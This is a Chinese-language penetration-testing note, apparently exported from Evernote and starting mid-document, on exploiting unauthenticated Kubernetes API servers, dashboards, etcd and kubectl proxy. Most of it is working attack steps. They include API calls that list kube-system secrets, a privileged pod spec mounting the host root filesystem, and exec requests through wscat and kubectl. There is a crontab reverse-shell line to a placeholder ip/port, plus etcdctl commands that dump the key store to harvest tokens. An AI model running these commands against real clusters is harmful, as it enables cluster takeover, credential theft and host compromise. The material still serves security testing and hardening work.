默认端口6443，修改标识—secure-port
默认IP是首个非本地主机的网络接口，修改标识—bind-address
HTTPS服务。设置证书和秘钥的标识，–tls-cert-file，–tls-private-key-file
认证方式，令牌文件或者客户端证书
使用基于策略的授权方式
这两个端口同利用方式，只要其中一个端口没做auth
8080端口访问如下，没做auth会直接列出API列表
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
7/20
6443需要https访问
(这里目标做了需要auth才能访问则会出现:system:anonymous)
查看kube-system命名空间下的所有token,GET:/api/v1/namespaces/kube-system/secrets/
查看所有容器(pods),GET:/api/v1/namespaces/default/pods?limit=500
查看token
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
8/20
所有容器查询
三种利用方式：
1. 请求对应的API接口创建pods执行命令 （允许匿名访问）
2. 利用kubectl (利用token验证，或者允许匿名访问)
3. 利用dashboard界面创建pods （如果存在dashboard,访问/ui就会跳转到）
API请求接口
创建特权容器,POST:/api/v1/namespaces/default/pods
{"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"
{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"test-4444\",\"namespace\":\"default\"},\"spec\":{\"containers\":
[{\"image\":\"nginx:1.14.2\",\"name\":\"test-4444\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"hostPath\":
{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host\"}]}}\n"},"name":"test-4444","namespace":"default"},"spec":{"containers":
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
9/20
[{"image":"nginx:1.14.2","name":"test-4444","volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"hostPath":
{"path":"/","type":"Directory"},"name":"host"}]}}
这里我已经创建过test-4444，下图创建的是joker
执行命令,GET:/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&stderr=1&tty=true&command=whoami
在用PostMan测试第三条执行命令的时候我出现了"Upgrade request required"(400)
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Upgrade request required",
  "reason": "BadRequest",
  "code": 400
}
经过查询发现：
对于websocket连接，首先进行http(s)调用，然后是使用HTTP Upgrade标头对websocket的升级请求。
curl/Postman不支持从http升级到websocket。因此错误。
解决办法就是用wscat工具发送包
wscat -n -c 'https://192.168.249.129:26443/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&stderr=1&tty=true&command=whoami'
(但是我这里不知道是不是由于8080端口的问题，wscat请求返回为空)
kali的wscat有毛病，必须把http/https换成ws
否则会出现下面错误
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
10/20
找别人测的
接口利用基本就这些，kubectl利用则如下
首先是不使用token看看能不能连的上
kubectl -s : 
利用token连接 （一般用不上，除非不用token连接失败或者用于6443端口验证或者用于dashboard验证）
kubectl -s : --kubeconfig-token get pods
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
11/20
这里kubectl有个坑，版本必须对应上。否则会出现以下错误
Error from（Not Acceptable）
这里用到的是v1.8.7
利用kubectl直接获取pod shell
kubectl get pods #获取所有容器
kubectl -s : --namespace=default exec -it  bash
kubectl创建pod
myapp.yaml
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
the command:
kubectl create -f /home/kali/Desktop/myapp.xml
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
12/20
向容器的 /mnt/etc/crontab 写入反弹 shell 的定时任务，因为创建容器时把宿主机的根目录挂载到了容器的/mnt 目录下，所以可以直接影响到宿主机的 crontab
(和docker一样的逃逸方法)
echo -e "* * * * * root bash -i >& /dev/tcp/ip/port 0>&1\n" >> /mnt/etc/crontab
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
13/20
利用dashboard
访问路径:/ui会跳转到/api/v1/proxy/namespaces/kube-system/services/kubernetes-dashboard/#!/workload?namespace=default
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
14/20
有些需要验证登录的则如下图
上传json (内容是刚刚那个yaml)
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
15/20
比较新的kubernetes是可以直接编辑创建的
fofa没找到未授权的kubernetes，利用方式差不多。也是新建一个pod然后在UI里访问利用
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
16/20
Etcd未授权访问
Etcd是Kubernetes集群中的一个十分重要的组件，是兼具一致性和高可用性的键值数据库，用于保存集群所有的网络配置和对象的状态信息。通常我们用etcd来存储两个重要服
务：
网络插件flannel
kubernetes本身，包括各种对象的状态和元信息配置
其默认监听了2379等端口，如果2379端口暴露到公网，可能造成敏感信息泄露。
访问https://IP:2379/v2/keys，有内容，类似{"action":"get","node":{"dir":true}} 这样的，就确定存在未授权访问
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
17/20
Etcd v2和v3是两套不兼容的API，K8s是用的v3，所以需要先通过环境变量设置API为v3
攻击机从 https://github.com/etcd-io/etcd/releases/ 下载 得到etcdctl。通过如下命令可以遍历所有的key：
ETCDCTL_API=3 ./etcdctl --endpoints=http://IP:2379/ get / --prefix --keys-only
如果服务器启用了https，需要加上两个参数忽略证书校验 --insecure-transport 和--insecure-skip-tls-verify
通过v3 API来dump数据库到 output.data
ETCDCTL_API=3 ./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://IP:2379/ get / --prefix --keys-only | sort | uniq | xargs -
I{} sh -c 'ETCDCTL_API=3 ./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://IP:2379 get {} >> output.data && echo "" >>
output.data'
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
18/20
从导出的文件里搜关键字ca.crt。根据对应的namespace和token来进行访问
有这个token就可以走6443端口访问了
kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443/ --token="" -n  get pods
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
19/20
我这里6443出现下面的错误。。8080就可以
Error from server (Forbidden): User "system:serviceaccount:kube-system:default" cannot list pods in the namespace "kube-system". (get pods)
拿到token后跟之前一样创建test_config控制集群
Kubectl Proxy命令未安全使用
k8s server执行
设置API server接收所有主机的请求：
kubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0 --port=8009
之后就可以通过特定端口访问k8s集群
kubectl -s http://192.168.1.101:8009 get pods -n kube-system
参考链接：
https://buaq.net/go-98824.html
http://f5.pm/go-103737.html
https://www.kingkk.com/2020/03/Kubernetes%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%92%8C%E4%B8%80%E4%BA%9B%E6%9C%AA%E6%8E%88%E6
https://github.com/zj1244/Blog/issues/6
https://www.jianshu.com/p/e443b3171253
2022/3/17 16:07
Evernote Export
file:///C:/Users/jiushi/Desktop/k8s未授权.html
20/20
https://kubernetes.io/zh/docs/reference/kubectl/cheatsheet/
https://blog.51cto.com/hequan/2406680
https://blog.csdn.net/BigData_Mining/article/details/88529157